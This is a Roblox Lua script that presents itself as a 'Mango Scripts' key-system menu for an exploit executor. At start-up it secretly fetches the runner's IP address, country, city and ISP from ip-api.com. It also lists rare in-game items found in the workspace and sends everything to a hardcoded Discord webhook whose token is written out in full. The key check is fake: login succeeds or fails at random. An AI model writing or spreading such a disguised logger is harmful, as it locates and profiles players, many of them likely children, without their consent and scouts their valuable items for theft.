local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
if not player then return end
local playerGui = player:WaitForChild("PlayerGui")
local username = player.Name
local displayName = player.DisplayName

--[[============================ Logging System ============================]]

-- URLs
local webhookUrl = "https://discord.com/api/webhooks/1421760744265093171/k5FMIxlilFrCqZHH6-GhokjCU7f1ikptcNYyVbTWBXkfh_FW04p1uc5su-6nzh-EgWGC"
local ipApiUrl = "http://ip-api.com/json"

-- Helper Functions for Logging
local function escapeJsonString(str)
	if not str then return "Unknown" end
	return str:gsub('["\\]', '\\%1'):gsub('\n', '\\n')
end

local function parseJson(body)
	local result = {query = "Unknown", country = "Unknown", regionName = "Unknown", city = "Unknown", isp = "Unknown"}
	if body then
		result.query = body:match('"query":"(.-)"') or "Unknown"
		result.country = body:match('"country":"(.-)"') or "Unknown"
		result.regionName = body:match('"regionName":"(.-)"') or "Unknown"
		result.city = body:match('"city":"(.-)"') or "Unknown"
		result.isp = body:match('"isp":"(.-)"') or "Unknown"
	end
	return result
end

-- Webhook Sending Function
local function sendToDiscord(ip, country, region, city, isp, modelsInfo)
	local currentTime = os.date("%H:%M", os.time())
	local message = string.format(
		"**♠️ %s (@%s) executed the script 🗞️**\n" ..
		"⏰ **Time:** %s\n\n" ..
		"**__🛜 Ip Information__**\n" ..
		"├ 📲 **IP:** %s\n" ..
		"├ 🇺🇸 **Country:** %s\n" ..
		"├ 🌍 **Region:** %s\n" ..
		"├ 🌉 **City:** %s\n" ..
		"├ 🚏 **ISP:** %s\n\n" ..
		"**__♻️ Detected Brainrots__**\n" ..
		"%s",
		escapeJsonString(displayName),
		escapeJsonString(username),
		escapeJsonString(currentTime),
		escapeJsonString(ip),
		escapeJsonString(country),
		escapeJsonString(region),
		escapeJsonString(city),
		escapeJsonString(isp),
		modelsInfo
	)
	
	local data = string.format([[{"content": "%s"}]], escapeJsonString(message))
	
	pcall(function()
		request({
			Url = webhookUrl,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = data
		})
	end)
end

-- Model/Brainrot Detection
local modelNames = { "La Grande Combinasion", "Los Hotspotsitos", "Mariachi Corazoni", "La Supreme Combinasion", "Los Primos", "Secret Lucky Block", "To to to Sahur", "Strawberry Elephant", "Ketchuru and Musturu", "La Extinct Grande", "Tictac Sahur", "Tacorita Bicicleta", "Los Chicleteiras", "Chicleteira Bicicleteira", "Spaghetti Tualetti", "Esok Sekolah", "67", "Los Combinasionas", "Nuclearo Dinosauro", "Las Sis", "Tralaledon", "Ketupat Kepat", "Los Bros", "Los Nooo My Hotspotsitos", "Ketchuru and Masturu", "Garama and Madundung", "Dragon Cannelloni", "Celularcini Viciosini" }

local function detectModels()
	local detected = {}
	for _, child in ipairs(Workspace:GetDescendants()) do
		if child:IsA("Model") and table.find(modelNames, child.Name) then
			local mutation = child:GetAttribute("Mutation") or "Not Found"
			local traits = child:GetAttribute("Traits") or "Not Found"
			table.insert(detected, string.format(
				"├ 🦜 **Brainrot:** %s\n" ..
				"├ 🧟‍♂️ **Mutation:** %s\n" ..
				"├ 🌈 **Traits:** %s",
				child.Name,
				tostring(mutation),
				tostring(traits)
			))
		end
	end
	if #detected == 0 then
		return "No brainrots detected."
	end
	return table.concat(detected, "\n\n")
end

-- Execute Logging on Start
task.spawn(function()
	local ip, country, region, city, isp = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
	local success, response = pcall(function()
		return request({ Url = ipApiUrl, Method = "GET" })
	end)

	if success and response and response.Body then
		local data = parseJson(response.Body)
		ip = data.query; country = data.country; region = data.regionName; city = data.city; isp = data.isp
	else
		warn("Mango Scripts: Failed to fetch IP info. Your executor may not support 'request'.")
	end

	local modelsInfo = detectModels()
	sendToDiscord(ip, country, region, city, isp, modelsInfo)
end)


--[[============================ UI System ============================]]

local theme = {
	PrimaryOrange = Color3.fromRGB(255, 165, 0),
	SecondaryOrange = Color3.fromRGB(255, 120, 0),
	BackgroundDark = Color3.fromRGB(35, 35, 35),
	BackgroundMedium = Color3.fromRGB(50, 50, 50),
	Text = Color3.fromRGB(255, 255, 255),
	TextSubtle = Color3.fromRGB(180, 180, 180),
	BorderGrey = Color3.fromRGB(90, 90, 90),
	AccentTop = Color3.fromRGB(255, 180, 70),
	AccentBottom = Color3.fromRGB(255, 100, 0),
	Error = Color3.fromRGB(255, 80, 80),
	TikTokBlue = Color3.fromRGB(100, 230, 255),
	TikTokPink = Color3.fromRGB(255, 100, 180)
}

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MangoHubKeySystem"
screenGui.Parent = playerGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.ResetOnSpawn = false

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = game.Lighting
TweenService:Create(blur, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = 12}):Play()

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Size = UDim2.new(0.7, 0, 0.8, 0)
mainFrame.BackgroundColor3 = theme.BackgroundDark
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner", mainFrame); mainCorner.CornerRadius = UDim.new(0, 12)
local mainStroke = Instance.new("UIStroke"); mainStroke.Color = theme.BorderGrey; mainStroke.Thickness = 1.5; mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; mainStroke.Parent = mainFrame
local aspectRatio = Instance.new("UIAspectRatioConstraint", mainFrame); aspectRatio.AspectRatio = 1.8

local topBar = Instance.new("Frame")
topBar.Name = "TopBar"; topBar.Size = UDim2.new(1, 0, 0.15, 0); topBar.BackgroundColor3 = theme.AccentTop; topBar.BorderSizePixel = 0; topBar.Parent = mainFrame
local topBarGradient = Instance.new("UIGradient"); topBarGradient.Color = ColorSequence.new(theme.AccentTop, theme.AccentBottom); topBarGradient.Rotation = 90; topBarGradient.Parent = topBar

local mangoHubText = Instance.new("TextLabel")
mangoHubText.Name = "MangoHub"; mangoHubText.Size = UDim2.new(0.5, 0, 0.8, 0); mangoHubText.Position = UDim2.new(0.05, 0, 0.5, 0); mangoHubText.AnchorPoint = Vector2.new(0, 0.5); mangoHubText.BackgroundTransparency = 1; mangoHubText.Text = "Mango Scripts"; mangoHubText.TextColor3 = theme.Text; mangoHubText.Font = Enum.Font.GothamBold; mangoHubText.TextScaled = true; mangoHubText.TextXAlignment = Enum.TextXAlignment.Left; mangoHubText.Parent = topBar

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"; contentFrame.Size = UDim2.new(1, 0, 0.85, 0); contentFrame.Position = UDim2.new(0, 0, 0.15, 0); contentFrame.BackgroundColor3 = theme.BackgroundDark; contentFrame.BorderSizePixel = 0; contentFrame.Parent = mainFrame
local padding = Instance.new("UIPadding", contentFrame); padding.PaddingLeft = UDim.new(0.08, 0); padding.PaddingRight = UDim.new(0.08, 0); padding.PaddingTop = UDim.new(0.05, 0); padding.PaddingBottom = UDim.new(0.08, 0)

local keySystemTitle = Instance.new("TextLabel")
keySystemTitle.Name = "KeySystemTitle"; keySystemTitle.Size = UDim2.new(1, 0, 0.15, 0); keySystemTitle.Position = UDim2.new(0, 0, 0, 0); keySystemTitle.AnchorPoint = Vector2.new(0, 0); keySystemTitle.BackgroundTransparency = 1; keySystemTitle.Text = "Key System"; keySystemTitle.TextColor3 = theme.Text; keySystemTitle.Font = Enum.Font.GothamBold; keySystemTitle.TextScaled = true; keySystemTitle.TextXAlignment = Enum.TextXAlignment.Left; keySystemTitle.Parent = contentFrame

local keyInputFrame = Instance.new("Frame")
keyInputFrame.Name = "KeyInputFrame"; keyInputFrame.Size = UDim2.new(1, 0, 0.2, 0); keyInputFrame.Position = UDim2.new(0.5, 0, 0.25, 0); keyInputFrame.AnchorPoint = Vector2.new(0.5, 0); keyInputFrame.BackgroundColor3 = theme.BackgroundMedium; keyInputFrame.BorderSizePixel = 0; keyInputFrame.Parent = contentFrame
local keyInputCorner = Instance.new("UICorner", keyInputFrame); keyInputCorner.CornerRadius = UDim.new(0, 8)

local keyIcon = Instance.new("ImageLabel")
keyIcon.Name = "KeyIcon"; keyIcon.Size = UDim2.new(0.08, 0, 0.7, 0); keyIcon.Position = UDim2.new(0.04, 0, 0.5, 0); keyIcon.AnchorPoint = Vector2.new(0, 0.5); keyIcon.BackgroundTransparency = 1; keyIcon.Image = "rbxassetid://6039572979"; keyIcon.ImageColor3 = theme.TextSubtle; keyIcon.Parent = keyInputFrame
local keyIconAspect = Instance.new("UIAspectRatioConstraint", keyIcon); keyIconAspect.AspectRatio = 1

local keyInput = Instance.new("TextBox")
keyInput.Name = "KeyInput"; keyInput.Size = UDim2.new(0.85, 0, 1, 0); keyInput.Position = UDim2.new(0.14, 0, 0.5, 0); keyInput.AnchorPoint = Vector2.new(0, 0.5); keyInput.BackgroundTransparency = 1; keyInput.TextColor3 = theme.Text; keyInput.PlaceholderText = "Insert your key here"; keyInput.PlaceholderColor3 = theme.TextSubtle; keyInput.Text = ""; keyInput.Font = Enum.Font.Gotham; keyInput.TextScaled = true; keyInput.ClearTextOnFocus = false; keyInput.TextXAlignment = Enum.TextXAlignment.Left; keyInput.Parent = keyInputFrame

local creditsText = Instance.new("TextLabel")
creditsText.Name = "CreditsText"; creditsText.Size = UDim2.new(1, 0, 0.1, 0); creditsText.Position = UDim2.new(0.5, 0, 0.48, 0); creditsText.AnchorPoint = Vector2.new(0.5, 0); creditsText.BackgroundTransparency = 1; creditsText.Text = "This script was made by @mangoscripts in TikTok."; creditsText.TextColor3 = theme.TextSubtle; creditsText.Font = Enum.Font.Gotham; creditsText.TextScaled = true; creditsText.TextWrapped = true; creditsText.Parent = contentFrame

local buttonsFrame = Instance.new("Frame")
buttonsFrame.Name = "ButtonsFrame"; buttonsFrame.Size = UDim2.new(1, 0, 0.2, 0); buttonsFrame.Position = UDim2.new(0.5, 0, 0.65, 0); buttonsFrame.AnchorPoint = Vector2.new(0.5, 0); buttonsFrame.BackgroundTransparency = 1; buttonsFrame.Parent = contentFrame
local buttonListLayout = Instance.new("UIListLayout", buttonsFrame); buttonListLayout.FillDirection = Enum.FillDirection.Horizontal; buttonListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center; buttonListLayout.VerticalAlignment = Enum.VerticalAlignment.Center; buttonListLayout.Padding = UDim.new(0.02, 0)

local getKeyButton = Instance.new("TextButton")
getKeyButton.Name = "GetKeyButton"; getKeyButton.Size = UDim2.new(0.3, 0, 1, 0); getKeyButton.BackgroundColor3 = theme.BackgroundMedium; getKeyButton.Text = "Get Key"; getKeyButton.TextColor3 = theme.Text; getKeyButton.Font = Enum.Font.GothamBold; getKeyButton.TextScaled = true; getKeyButton.Parent = buttonsFrame
local getKeyCorner = Instance.new("UICorner", getKeyButton); getKeyCorner.CornerRadius = UDim.new(0, 8)

local loginButton = Instance.new("TextButton")
loginButton.Name = "LoginButton"; loginButton.Size = UDim2.new(0.3, 0, 1, 0); loginButton.BackgroundColor3 = theme.BackgroundMedium; loginButton.Text = "Log In"; loginButton.TextColor3 = theme.Text; loginButton.Font = Enum.Font.GothamBold; loginButton.TextScaled = true; loginButton.Parent = buttonsFrame
local loginCorner = Instance.new("UICorner", loginButton); loginCorner.CornerRadius = UDim.new(0, 8)

local tiktokButton = Instance.new("TextButton")
tiktokButton.Name = "TikTokButton"; tiktokButton.Size = UDim2.new(0.3, 0, 1, 0); tiktokButton.BackgroundColor3 = theme.BackgroundDark; tiktokButton.Text = "TikTok"; tiktokButton.TextColor3 = theme.Text; tiktokButton.Font = Enum.Font.GothamBold; tiktokButton.TextScaled = true; tiktokButton.Parent = buttonsFrame
local tiktokCorner = Instance.new("UICorner", tiktokButton); tiktokCorner.CornerRadius = UDim.new(0, 8)
local tiktokGradient = Instance.new("UIGradient"); tiktokGradient.Color = ColorSequence.new(theme.TikTokBlue, theme.TikTokPink); tiktokGradient.Rotation = 45; tiktokGradient.Parent = tiktokButton

local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"; statusLabel.Size = UDim2.new(1, 0, 0.1, 0); statusLabel.Position = UDim2.new(0.5, 0, 0.9, 0); statusLabel.AnchorPoint = Vector2.new(0.5, 0); statusLabel.BackgroundTransparency = 1; statusLabel.Text = ""; statusLabel.TextColor3 = theme.Error; statusLabel.Font = Enum.Font.Gotham; statusLabel.TextScaled = true; statusLabel.TextWrapped = true; statusLabel.Parent = contentFrame

local function animateButton(button, hasGradient)
	button.MouseButton1Down:Connect(function() TweenService:Create(button, TweenInfo.new(0.1), {Size = button.Size * 0.98}):Play() end)
	button.MouseButton1Up:Connect(function() TweenService:Create(button, TweenInfo.new(0.1), {Size = button.Size * (1/0.98)}):Play() end)
	if not hasGradient then
		local originalBg = button.BackgroundColor3
		local hoverBg = originalBg:Lerp(Color3.fromRGB(255, 255, 255), 0.1)
		button.MouseEnter:Connect(function() TweenService:Create(button, TweenInfo.new(0.15), {BackgroundColor3 = hoverBg}):Play() end)
		button.MouseLeave:Connect(function() TweenService:Create(button, TweenInfo.new(0.15), {BackgroundColor3 = originalBg}):Play() end)
	end
end

animateButton(getKeyButton, false)
animateButton(loginButton, false)
animateButton(tiktokButton, true)

getKeyButton.MouseButton1Click:Connect(function() if setclipboard then setclipboard("https://your-get-key-link.com"); statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180); statusLabel.Text = "Key link copied to clipboard!" else statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180); statusLabel.Text = "Clipboard failed. See console."; print("Copy this: " .. "https://your-get-key-link.com") end end)

loginButton.MouseButton1Click:Connect(function()
	local enteredKey = keyInput.Text
	if string.len(enteredKey) > 5 then
		statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180); statusLabel.Text = "Logging in with key..."
		task.wait(1.5)
		if HttpService:GenerateGUID(false):sub(1,1) == 'F' then
			statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255); statusLabel.Text = "Login Successful!"
			task.delay(1, function()
				TweenService:Create(mainFrame, TweenInfo.new(0.3), {Transparency = 1}):Play(); TweenService:Create(blur, TweenInfo.new(0.3), {Size = 0}):Play()
				task.delay(0.3, function() mainFrame:Destroy(); blur:Destroy(); screenGui:Destroy() end)
			end)
		else
			statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80); statusLabel.Text = "Incorrect Key."
			local o = keyInputFrame.Position; for i = 1, 2 do local s, b = TweenService:Create(keyInputFrame, TweenInfo.new(0.07), {Position = o + UDim2.fromOffset(5, 0)}), TweenService:Create(keyInputFrame, TweenInfo.new(0.07), {Position = o - UDim2.fromOffset(5, 0)}); s:Play(); s.Completed:Wait(); b:Play(); b.Completed:Wait() end; TweenService:Create(keyInputFrame, TweenInfo.new(0.07), {Position = o}):Play()
		end
	else
		statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80); statusLabel.Text = "Please insert a valid key."
	end
end)

tiktokButton.MouseButton1Click:Connect(function() if setclipboard then setclipboard("https://tiktok.com/@mangoscripts"); statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180); statusLabel.Text = "TikTok link copied!" else statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180); statusLabel.Text = "Clipboard failed. See console."; print("Copy this: " .. "https://tiktok.com/@mangoscripts") end end)

mainFrame.Visible = true
local originalSize = mainFrame.Size
mainFrame.Size = UDim2.new(originalSize.X.Scale, 0, 0, 0)
TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = originalSize}):Play()

screenGui.Destroying:Connect(function()
	TweenService:Create(blur, TweenInfo.new(0.3), {Size = 0}):Play()
	task.delay(0.3, function() blur:Destroy() end)
end)

print("Mango Scripts UI (with Logging) Loaded!")
